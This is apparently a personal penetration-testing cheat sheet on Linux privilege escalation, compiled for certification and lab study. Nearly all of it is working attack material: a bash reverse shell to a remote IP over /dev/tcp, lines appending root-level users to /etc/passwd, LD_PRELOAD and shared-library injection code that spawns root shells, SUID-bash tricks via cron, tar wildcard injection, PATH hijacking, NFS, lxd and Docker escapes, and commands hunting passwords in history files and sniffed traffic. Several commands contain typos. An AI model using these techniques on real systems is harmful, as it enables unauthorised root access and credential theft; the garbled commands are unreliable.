# Linux Privilege Escalation 


For [[Core-Linux-Commands]]
For [[Grep-All-The-Things]]
For [[Linux-Module-Commands]]
For [[Linux-Networking-Commands]]
For [[Important-Linux-Locations]]

## Got on the box, have a look

[[Privilege-Escalation]] commonly without binary exploitation focuses on misconfigurations surrounding access control.
- RTFM, Ready the binaries to drop - check the 32bit or 64bit!
- Rely on knowing how it should be configured - do not rely one or two enumeration scripts for this specific task  
- Don't be lazy but not be stupid, scripts that try to exploit are no good for some Certifications, but they are also good..
- Marshalling data to a directory with permission control in Linux means cp to your controlled directory has parent directory permission under user context.
- `/dev/shm` is share memory and so [[Linux-File-Transfers]] to this directory be more evasive. Check `mount` if is has `no exec`.
- `strance` are system calls: lots of info use `ltrace` for library calls, less junk information, easier to read.

Linux PrivEsc is the Power of `R` `W` `X`) -
`Tool (--help,RTFM) -> input -> [CONTEXT] -> (how the below then get you root/privesc)`
- Can binary/script read a file if so how
- can binary/script write if so how
- Cand binary/script execute if so how

[Linpeas](https://github.com/carlospolop/PEASS-ng) is OSCP exam friendly now, [LinEnum](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh) see [[LinEnum-Helpsheet]], [lse](https://github.com/diego-treitos/linux-smart-enumeration)

Reduce cleanup and human error plus increase stealth with marshalling data in one word writable directory 
```bash
/tmp # is good 
/dev/shm  # can we run in memory? If so much better
# /dev/shm may have noexec flag requires:
mount | grep shm
```

## Lay of the land enumeration:

You may end up in a docker container consider: [[Docker-Hacking]]. If it is not docker then you may need to escape a Kubernetes cluster; for more detailed information about Kubernetes or Hacking Kubernetes see [[Kubernetes]] and [[Kubernetes-Hacking]]
```bash    
whoami                  # beware of alerts 
id                      # user and usergroup info
ls -la /                # never use ls check for .dockerenv - ls -la for permission

lscpu                   # Check you cpu arch!
cat /etc/shells         # Some shell are less secure than others
cat /etc/issue  
cat /etc/*-release  
cat /etc/lsb-release      # Debian based  
cat /etc/redhat-release   # Redhat based
cat /etc/fstab			# File system table
uname -a                # get system info # search for kernel exploits as last resort
uname -ar  
hostname
```

Check for defences - see [[Linux-Hardening]]
- [Exec Shield](https://en.wikipedia.org/wiki/Exec_Shield)
- [iptables](https://linux.die.net/man/8/iptables)
- [AppArmor](https://apparmor.net/)
- [SELinux](https://www.redhat.com/en/topics/linux/what-is-selinux)
- [Fail2ban](https://github.com/fail2ban/fail2ban)
- [Snort](https://www.snort.org/faq/what-is-snort)
- [Uncomplicated Firewall (ufw)](https://wiki.ubuntu.com/UncomplicatedFirewall)

## Network Architecture

How is the box configured to communicate to other boxes?
```bash
ifconfig                # Legacy Network interfaces
ip a					# Network interfaces - requires net-tools package
ip route                # Network route, check route or routel
ss -a              # All listening port and connections
ss -at -au         # All TCP or UDP connections
ss -l              # All listening ports
ss -s              # Statistics
ss -tulpn              # O'Faithful 
netstat -tp             # PID information (Netstat is legacy!)
netstat -anp           # List all, avoid hostname resolution, proc names 
netstat -anlp            # Same as above except only listening
netstat -ano
route 
routel                  # route for some nix distros   
netstat -rn             # Same a route           
cat /proc/net/arp       # IPv4 resolution - what mahcines connect
arp -a                  # similar to /proc/net/arp, do both
cat /etc/hosts          # DNS
cat /etc/resolv.conf    # DNS - internal DNS? 
cat /etc/iptables       # beware persistent/non-persistent iptables rules - netfilter at boot
cat /etc/iptables/rules.v4 # 
```

## Patch Level

What unsafe level of up-to-date software is on the machine?
```bash
lsmod
dpgk -l # debian=
rpm -qa # CentOS, OpenSuse, Fedora, RHEL
pkg_info # OpenBSD FreeBSD
/sbin/modinfo # libATA
apt list --upgradeable  # Software installed and versioning
apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list 
which python3 && which python && which nc; # example list of stuff to use
# GTFObin checker
# https://gtfobins.github.io/
for i in $(curl -s https://gtfobins.github.io/ | html2text | cut -d" " -f1 | sed '/^[[:space:]]*$/d');do if grep -q "$i" installed_pkgs.list;then echo "Check GTFO for: $i";fi;done
# Strace for who a binary interacts - accesses system resources, processes signals, and receives and sends data from the operating system.
strace $binary
ls -l /bin /usr/bin/ /usr/sbin/ # Binaries
```

## User and Privilege Groups

What is current (recursive - per user) security context of a user and is there over-extensions to access control granted to that user or group?  
```bash
# Privileged Groups
id 
# adm group -  can read /var/log/*
# disk group - full access to any devices within /dev/* use: `debugfs`  
# lcx/lxd group - Check section below
# Docker group - can spawn new containers + moont + add/retrieve ssh keys for root user

cat /etc/passwd         # grep for what you what but situation awareness! Login shell have vulnerabilities
cat /etc/group         # groups
getent group sudo      # get entry to a group $groupfind / ! -path "*/proc/*" -iname "*conf*" -type f 2>/dev/null from /etc/group
getent group adm
```

Check command history for accidental passwords pastes or typed 
```bash
history # command history
find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null # find history files
```

Check user sessions on the machine
```bash
who                     # Which users are logged in
lastlog
w
```

User PATH and environment variable may have configurations differences
```bash
echo $PATH              # Path variable - how binaries are found to then run
env                     # environment variables
```

## Files, Artefacts of interest or Passwords and shiny things?

What [[Important-Linux-Locations]] or custom location have credentials or control services, software, credentials, etc
```bash
ls -la /home
# Interesting files of a User
find / -user $USER -ls 2>/dev/null | grep -v '/run/\|/proc/\|/sys/'

getfacl $directory/file # Special permissions like: drwxr-x---+  

# Webshell in?
# Check per subdomain for data handling
# Find where it communicates with any databases 
find . -type d -name *onf* 2>/dev/null
find . -type f -name *onf* 2>/dev/null
# PHP function that lead to passwords
grep -r -e require_once

# Find and Xargs and grep all configuration files
find . -type f -name "*.*onf*" 2>/dev/null | xargs grep -rie 'passw'
find . -type f -name config* 2>/dev/null | xargs grep -rie 'passw'
find . -type d -name *onf* 2>/dev/null | ls | xargs grep -rie 'passw'
find / -type f -name "*.log" 2>/dev/null
find . -type f 2>/dev/null             # for those id_rsas @rennox 
find . -type f -perm /o=r -print0 | xargs -0 grep -l password=

grep -r -e '.conf\|config*'

cat /home/$user/myvpn.ovpn
cat /etc/openvpn/auth.txt
cat /home/$user/.irssi/config | grep -i passw # IRC client
cat /home/$user/.bash_history # Mangled or mistaken passwords in the commandline history
cat ~/.bash_history | grep -i passw
ls -la /home/$user/.ssh/ # SSH key to log in!


cat /etc/fstab          # check for mounted and unmounted drives for important files
cat /etc/fstab | grep -v "#" | column -t # check unmount file systems
find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null # hidden files 
find / -type d -name ".*" -ls 2>/dev/null # hidden directories 
ls -l /tmp /var/tmp /dev/shm # temporary files

find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share" # scripts

## Found any?
/var/log
/var/log/auth.log
/var/spool/mail

cat * | grep -i passw*
cat /etc/passwd                        # displays all users - occasionally hashes..
cat /etc/passwd | grep home            # show all real users!
cat /etc/shells                        # displays all shells
cat /etc/crontab                       # displays cronjobs
ls -la /etc/cron.d                     # directory that contains all cronjobs
cat /etc/hosts
cat /etc/resolv.conf
ls -la ~/.*history                     # All the history files in a directory
cat ~/.*history | less                 # view all them
cat /proc/cpuinfo                      # duh, but also nproc show number of cpus
cat /proc/version                      # for kernel version
cat /etc/issue
cat /etc/exports                       # Check for no_squash_root on writable shares 

##  Stored Creds in cat-able config, history, txt files
cat /../*.*vnp
cat ~/.bash_history | grep -i passw


file /sbin/init         # Is asymbolic link to /lib/systemd/systemd OR..


```

Create passwords
```bash
mkpasswd -m sha-512 Password1234
```

#### World writable files and directories to check

Where can anyone write?
```bash
# Writable directories
find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
# Writable files
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```

Always check permissions custom scripts deeper binaries and scripts that are used.
```bash
ls -la /etc/hosts; && ls -la /etc/crontab && ls -la /etc/shadow && ls -la /etc/shadow.bak 
find / -writable -type d 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
find / -perm -222 -type d 2>/dev/null
find / -perm -o w -type d 2>/dev/null

chown -R $user:$user /$path # recursive chown if in need to pwn 
chmod 7777 $privEscFile # set sticky bit, suid, guid  

pythonscript.py -i # interactive python in security context
```

Touch or edit some file with for shell; don't forget Language, file extensions, shared binaries or libraries. This just a placeholder example:  
```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
```

Writable `/etc/passwd`? Some OSes support hashes in `/etc/passwd`
```bash
# r00t : r00t
echo "r00t:jIqZM0B41vZQs:0:0:root:/root:/bin/bash" >> /etc/passwd
```

#### Weak file permission on password system

```bash
cat /etc/passwd | cut -d: -f1 | awk -F: '($3 == "0") {print}' /etc/passwd
ls -la /etc/shadow | cat /etc/shadow
# For /etc/passwd use one of the below
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
# Then
echo 'hacker:$GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash' >>/etc/passwd
```
NOTE: In BSD platforms `/etc/passwd` is located at `/etc/pwd.db` and `/etc/master.passwd`, also the `/etc/shadow` is renamed to `/etc/spwd.db`.

#### Weak sensitive files permissions

Beware these can break some shells
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```

#### User-key related
Create a password hash that is compliant use ssh-keygen, generate a ssh key, store in `/root/.ssh`
```bash
openssl passwd -1 -salt [salt] [password]
chmod 600 $key
ssh -i id_rsa root@ip                      
```
Find those keys!
```bash
find / -name authorized_keys 2>/dev/null ## Find ssh keys
find / -name id_rsa 2>/dev/null
```
copy keys  
```bash
chmod 400 id_rsa
ssh -i _id_rsa [id]@[ip]
```


## Devices, Drives and Disks

What devices could or are already connected to the filesystem, what is there purpose and what do they contain - is the configuration unsafe?
```bash
# unmounted drives may contain sensitive data
lsblk                   # list block devices - view all avaliable disks and drives
df -h                   # check what is mounted and what is not - script remounting to prevent regular use
lpstat                  # printers attached
```


## Path misconfiguration

Adding a . to a user's PATH adds their current working directory to the PATH list. 
```bash
. # if you do not have to write ./bin
# You will be able to execute any script or binary that is in the current directory
./. # is how it should be configured

$PATH # It you can write inside some directory the $PATH create a backdoor there that is name of a command by escalation target

PATH=.:${PATH}
export PATH
```

Usually `$PATH` should be order similar to: `/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin`

#### `LD_LIBRARY_PATH`

[LD_LIBARARY_PATH article](https://www.hpc.dtu.dk/?page_id=1180) : *`LD_LIBRARY_PATH` tells the dynamic link loader (ld. so – this little program that starts all your applications) where to search for the dynamic shared libraries an application was linked against.* See [[Linux-Shared-Libraries]] for more information.

Analysing `$file.so` 
```bash
# ldd
ldd $FILE
# objdump
objdump -p $FILE | grep 'NEEDED'
# readelf
readelf --dynamic $FILE | grep NEEDED

# find the pid and checking /proc maps file
pgrep $target
cat /proc/$PID/maps 
awk '$NF!~/\.so/{next} {$0=$NF} !a[$0]++' /proc/$PID/maps 
```

If a `.so` file is missing we can hijack execution, by provide a malicious shared library file of the same name in the `LD_LIBRARY_PATH`.
#### Path injection

Can we inject our abusive path into the `$PATH` before legitimate application is called?
```bash
echo $PATH 
find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
```

Make file identical to command, containing 'bash -p', `chmod`-ing, export PATH and then run vulnerable file.
```bash
mkdir badapple; echo 'bash -p' > badapple/cp
chmod +x badapple/cp
export PATH="/dev/shm/badapple/:$PATH"
./runvulnbin
# If sudo is involved
```

## Processes

What processes are running as root?
```bash
ps 1                    # Systemd or SysV init
ps aux                  # All processes
ps au                   # Current processes
ps aux | grep root      # find weird processes run by root change for $user
ps ajxf                 # Process tree
# proc filesystem /proc || /procfs
find /procfs -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"
find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"
# credentials in config via 
find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
```

## Shell Relate

#### Wildcard Abuses

Wildcard characters exist and indicative of a need to generalise something, so can we control what will be selected, because of a requirement to generalise?
```bash
# Application -> Action on `*` 
# Due to a wildcard (*)  can be defined to privilege escalate), rather than `x` of `X`, which specifies what action is operated on
# Look for:
* # Any number of characters
? # Any single character
[ ] # Any characters enclosed can match any single one at the defined position
~ # Denotes home directory of uid 
- # Denotes a range of characters
```

Bash Globbing - File Name Expansion - [[Regular-Expressions]]; explanation below
```bash
# * wildcards 
# each command effective achieves the same result
ls && ls * && echo *
# Regexs are also possible!
# For PrivEsc
# Bash is not context aware regarding passed arguments
# Filename restrictions on Linux are almost non-existent - we can have filenames called:
touch ./--help
```
Simply any bash scripting that contains `*` check GTFObins for `shell` of the command containoing a `*` argument - from: [Tib3rius - Weird PrivEsc Techniques YouTube](https://www.youtube.com/watch?v=wyeRPSjnNjY)
## Sudo 

Is the `sudo` or similar like `doas` vulnerable as software or is there an misconfiguration either in  implementation of `sudo` or how `sudo` can be used with configuration of filesystem, binaries, services, etc?

`sudo cat /etc/sudoers` specifies which users or groups are allowed and with what privilege to run specific programs. Sudo and similar program are a common target for [[Binary-Exploitation]] as inherently privilege changes at some point during execution. 

`sudo` usage requires `tty`
```bash
# Sudo -l but no password NO problem!
sudo -l # Or specific custom applications/scripts
# Dork the version or be squdontgettoescalate!
sudo -V  # Check sudo version..
cat /etc/lsb-release # ...and OS version as exploitation may be OS specific

sudo id                 # get id of sudo
visudo                  # sudo policy file
```

If a script or code is writable requires `sudo` permissions to execute:
```bash
# Copy a new bash
cp /bin/bash /tmp/shell
# Add to script/code
chown root:root; chmod 4755 /tmp/shell
# Escalate
./shell -p
# If you can path hijack a binary from $vuln script provide a path
sudo PATH=/dev/shm:$PATH $vulnScript
# sudo -u to abuse file permission to call sudo through unsafe variable input, handling
sudo -u username unsafefileofusername # somehow pass /bin/bash as paramtres
```

Shell escaping, abusing intended functionality - **Check** [GTFOBins](https://gtfobins.github.io/)
```bash
sudo apache2 -f /etc/shadow
```

#### Sudo LD_PRELOAD  

#### if LD_PRELOAD appears in output
1. create .c -> compile  
1. gcc `gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles);`  
This:
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

This set the `LD_PRELOAD` to the path of a shared object, which will be loaded before any other library (including C runtime, libc.so  
```bash
sudo LD_PRELOAD=/tmp/x.so [/some/bin/or/prog]
```
Tiberius Room versions/additions: 

Careful `-nostartfiles` Do not use the standard system startup files when linking.
```bash
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c 
sudo LD_PRELOAD=/tmp/preload.so program-nam2e-here
```
Also
```bash
ldd /usr/sbin/apache2 # find shared libraries
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp apache2
````


## Set-UID/Set-GID

When a effective user or group ID (eUID, eGID) is granted to application it inherits UID or GID of the permissions of the file owner. Exploit-DB, Google, and GitHub. [GTFOBINs](https://gtfobins.github.io/) are your friends. Set User ID, Set Group ID permission files run in the context of owner, bash drops set-SUID permissions, but `dash` does not drop SUID permissions. [Special permissions documentation](https://linuxconfig.org/how-to-use-special-permissions-the-setuid-setgid-and-sticky-bits)

SUID (Set-user Identification) and SGID (Set-group Identification), look for "s" set.
```bash
# SUID
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
find / -type f -perm -u=s -exec ls -ldb {} \; 2>/dev/null
# SGID
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
# Both
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2>/dev/null
find / -perm -g=s -o -perm -u=s -type f 2>/dev/null

# Sudo and SUID and SGID
sudo -l
# -4000 for suid
# -2000 for sgid
find / -type f -perm -04000 -ls 2>/dev/null
find / -type f -perm -04000 -o -2000 2>/dev/null

```

#### SUID Environment Variables

First find vulnerable binaries
```bash
find / -type f -perm -04000 -ls 2>/dev/null
```
**REQUIRES STRINGS!!**  consider encodings `-e` 
```bash
strings ../bin/<suid-env> # consider the function calls in the strings output
```
Inject-able `suidlib.c` or some other function somewhere else in the file system?
Inject a path to renamed "escalation.c" to required by the binary *.c
```bash
echo 'int main() {setgid(0); setuid(0); system("/bin/bash"); return 0;}' > /tmp/service.c #escalation->service.c
gcc /tmp/service.c -o /tmp/service # compile with naming to match target 
export PATH=/tmp:$:PATH # inject a path 
/usr/local/bin/<suid-env>
```
Dodgy services in the strings output
Method #1
> Bash versions < 4.2-048 it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used instead of any actual executable at that file path. 

function /usr/sbin/service() { 
```bash
cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p;}
export -f /usr/sbin/service
```  
Method #2  
ONLY Bash versions <= 4.3!!  
> *When in debugging mode, Bash uses the environment variable PS4 to display an extra prompt for debugging statements* 
```bash
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p'
```

#### SUID (symlinks)

Commence [[Search-Engine-Dorking]]   
```bash
dpkg -l | grep <program>
```

## Shared Object Injection

First output all SUID binaries
```bash
find / -type f -perm -04000 -ls 2>/dev/null
````
List packages -> version enumeration!
```bash
dpkg -l | grep #for the package
```
Run strace to check if there missing binaries
```bash
strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
```
Impersonate directory and file to replace missing SUID: `mkdir /home/user/.config | cd /home/user/.config` 
```c
#include <stdio.h>
#include <stdlib.h>
static void inject() __attribute__((constructor));

void inject() {system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");}
```
Save libcalc.c 
```bash
gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
/usr/local/bin/suid-so
```


## Capabilities

Check the capabilities
```bash
getcap -r / 2>/dev/null
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
```
Extensive list of all possible capabilities on [HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities)

Capability Values
```bash
= #  sets the specified capability for the executable, but does not grant any privileges

+ep # grants the effective and permitted privileges for the specified capability to the executable

+ei # grants sufficient and inheritable privileges for the specified capability to the executable

+p # grants the permitted privileges for the specified capability to the executable
```

Look for `CAP_SETUID`, `CAP_SETGID` (previous two are capacity to set SUID GUID) and `CAP_SYS_ADMIN` has braod administrative privileges.

Find `setcap` with sticky bit permissions
```bash
# Find setcap here
find / -type f -perm -04000 -ls 2>/dev/null
# Ver the capabilities on a linux system
getcap -r / 2>/dev/null
# copy a binary we control without changing the original 
cp /usr/bin/python3 /tmp/python3 # or /dev/shm 
# give this binary the capabilites to setuid
setcap cap_setuid+ep python3
/usr/bin/python[ver] -c 'import os; os.setuid(0);os.system("/bin/bash")'
```

## Unmounted Filesystems

```bash
mount -l
cat /etc/fstab # beware output length 
```

## Cron related 

```bash
cat /etc/crontab
ls -la [anyfiles] for permissions
cat [anyfiles] for wildcards in scripting
crontab -l # per-user user crontab!
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
ls -la /etc/cron.d
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
```

```bash
# Inspect cron log file for running jobs
grep "CRON" /var/log/syslog
```

#### Cron Path

PATH variable of files
```bash
echo 'cp /bin/bash /tmp/bash; chmod +xs /tmp/bash' > /home/user/privescCron
chmod +x /home/user/privescCron
/tmp/bash -p
```

#### Cron Wildcards

Either 1. use native binaries OR 2. msfvenom reverse shell
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/privescCron # Only 1st
touch /home/user/--checkpoint=1 # BOTH require this
touch /home/user/--checkpoint-action=exec=sh\ runme.sh #..=exec=shell.elf
/tmp/bash -p # Only 1st
```

#### Cron File Permissions 

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/privescCron
/tmp/bash -p
```

## Services

Find services running as root and consider whether they are exploitable if no password is set!
```bash
ps -aux | grep root
```

## NFS root squashing - found ls -la /etc/exports ?

Network File System (NFS) is network hosted file and directory sharing on [[Network-Protocols]] TCP/UPD 2049 and 111 - is it `no_root_squash`

Options:
- `root_squash` 
	- All access, creation and upload will be changed to the unprivileged account  `nfsnobody`
- `no_root_squash`:
	- Remote users connect as the local root user - SUID bits can be set! 

Find  `no_root_squash` 
```bash
# From Host
showmount -e $remoteIP
mkdir /mnt/$nameofmount
# version 2 does not have authenication or authorization 
mount -o rw,vers=2 $remoteIP:/$ExportedLocation /tmp/$nameofmount  # -nolock
echo '#include <stdio.h>\n#include <sys/types.h>\n#include <unistd.h>\nint main() {\n    setgid(0); setuid(0); system("/bin/bash"); return 0;\n}' > /tmp/nameofmount/x.c
gcc /tmp/nameofmount/x.c -o /tmp/nameofmount/x

sudo mount -t nfs $IP:/$nameofmount /mnt
chmod u+s /mnt/$nameofmount/x
# Target
/mnt/nameofmount/x
# Unmount
sudo umount /$path
```


## Hijacking Terminal Multiplexers Session

Can we access sessions that left active or is the process running as a privileged user?

[tmux](https://en.wikipedia.org/wiki/Tmux) 
```bash
ps aux | grep tmux
# Check socket path
ls -la /$socketPath
# Hijack by attaching to a tmux session
tmux -S $socketPath
tmux attach $session
```

## Find lxd and lxc?

Enumerate and file transfer an image
```bash
lxd version
lxc image list
# Check if user is in lxc/lxd groups
cat /etc/group | grep $USER
```
[Hacktricks lxd privesc due to group article](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation)
Similarly without bulding the image and using a image on the box:
 1. import image 
 2. run image 
 3. `/mnt` into box itself 
 4. start container and run sh
```bash
lxc image import ./alpine*.tar.gz --alias $myimage
lxc init $myimage $mycontainer -c security.privileged=true
lxc config device add $mycontainer  mydevice disk source=/ path=/mnt/root recursive=true
xc start $mycontainerkernel
lxc exec $mycontainer /bin/sh
cd /mnt/INTO/INTOAGAIN # Metaphorical PrivEsc method of a portal gun and pirate ship boarding. :)
```

## Docker

Check [[Docker-Hacking]] for full cheatsheat.
```bash
# Docker group - can spawn new containers + moont + add/retrieve ssh keys for root user
id 
ls -la / # for .dockerenv
env # credentials and networking information in environment variables
docker image ls
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
```

## Ansible

Find a writeble playbook or be able to run a bad playbook for some bad Ansible with [shell module](https://docs.ansible.com/ansible/latest/collections/ansible/builtin/shell_module.html)
```yaml
# $USER must be specifed
- name: Bad bash
  ansible.builtin.shell: "cp /bin/bash /home/$USER/bash; chmod u+s /home/$USER/bash"
```

## Traffic Capture

If `tcpdump` see [[Tcpdump-Cheatsheet]] or similar packet capture software is installed it may use to capture sensitive traffic - credentials that can be replayed or reused by an attacker with

- [net-creds](https://github.com/DanMcInerney/net-creds) which *"Sniffs sensitive data from interface or pcap"* from:
	- URLs visited
	- POST loads sent
	- HTTP form logins/passwords
	- HTTP basic auth logins/passwords
	- HTTP searches
	- FTP logins/passwords
	- IRC logins/passwords
	- POP logins/passwords
	- IMAP logins/passwords
	- Telnet logins/passwords
	- SMTP logins/passwords
	- SNMP community string
	- NTLMv1/v2 all supported protocols: HTTP, SMB, LDAP, etc.
	- Kerberos
```bash
# Infiltrate script
python net-creds.py -i $interface -f $IgnorePacketsFromIPAddr 
python net-creds.py -p $ReadFromPCAPfile.pcap
```


- [PCredz](https://github.com/lgandx/PCredz) *"extracts Credit card numbers, NTLM(DCE-RPC, HTTP, SQL, LDAP, etc), Kerberos (AS-REQ Pre-Auth etype 23), HTTP Basic, SNMP, POP, SMTP, FTP, IMAP, etc from a pcap file or from a live interface."*

Install and run with [[Docker]]
```bash
git clone https://github.com/lgandx/PCredz.git
docker build . -t pcredz
docker run --net=host -v $(pwd):/opt/Pcredz -it pcredz
```
## Sniffing Services

```bash
watch -n 1 "ps -aux | grep -i pass"
sudo tcpdump -i lo -A | grep -i "pass"
```

## Kernel Exploits

Enumerate Linux Distro flavor OS and the Kernel version. Match the compiler with the architecture of our target.
```bash
# check kernel level
uname -a
arch
lsmod # Loaded kernel modules
/sbin/modinfp $module # information of kernel modules
cat /etc/issue
cat /etc/lsb-release
# Searchsploit o'clock!
# Warning either compile on box if in scope or replicate context: libaries, versioning, etc 
```

## RC Misconfigurations

```bash
# .bashrc weirdness
# disabling a bash builtin may lead to path injection
enable -n $Builtin
# As pathing to the builtin that is a file is then controllable:
export PATH=/dev/shm:$PATH
/dev/shm/[
```

## References

[linprivesc](https://tryhackme.com/room/linprivesc)
[linuxprivesc](https://tryhackme.com/room/linuxprivesc) - Sagi Shahar/Tib3rius room
[linuxprivescarena](https://tryhackme.com/room/linuxprivescarena)
[commonlinuxprivesc](https://tryhackme.com/room/commonlinuxprivesc)
[lpeworkshop](https://github.com/sagishahar/lpeworkshop)
[netbiosX](https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md)
[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
[sushant747](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html)
[payatu](https://payatu.com/guide-linux-privilege-escalation)
[Wild west hackin' Fest Jake Williams - Talk: Privilege Escalation](https://www.youtube.com/watch?v=yXe4X-AIbps)
[Udemy - tib3rius](https://www.udemy.com/user/tib3rius/)
[Hacking Articles linux-privilege-escalation-using-capabilities](https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/)
[Ansible shell module](https://docs.ansible.com/ansible/latest/collections/ansible/builtin/shell_module.html)
[LinxConfig.org](https://linuxconfig.org/how-to-use-special-permissions-the-setuid-setgid-and-sticky-bits)
[HackTricks - Extensive list of all possible capabilities](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities)
[Exec Shield](https://en.wikipedia.org/wiki/Exec_Shield)
[iptables](https://linux.die.net/man/8/iptables)
[AppArmor](https://apparmor.net/)
[SELinux](https://www.redhat.com/en/topics/linux/what-is-selinux)
[Fail2ban](https://github.com/fail2ban/fail2ban)
[Snort](https://www.snort.org/faq/what-is-snort)
[Uncomplicated Firewall (ufw)](https://wiki.ubuntu.com/UncomplicatedFirewall)
[LD_LIBARARY_PATH article](https://www.hpc.dtu.dk/?page_id=1180)
[Tib3rius - Weird PrivEsc Techniques YouTube](https://www.youtube.com/watch?v=wyeRPSjnNjY)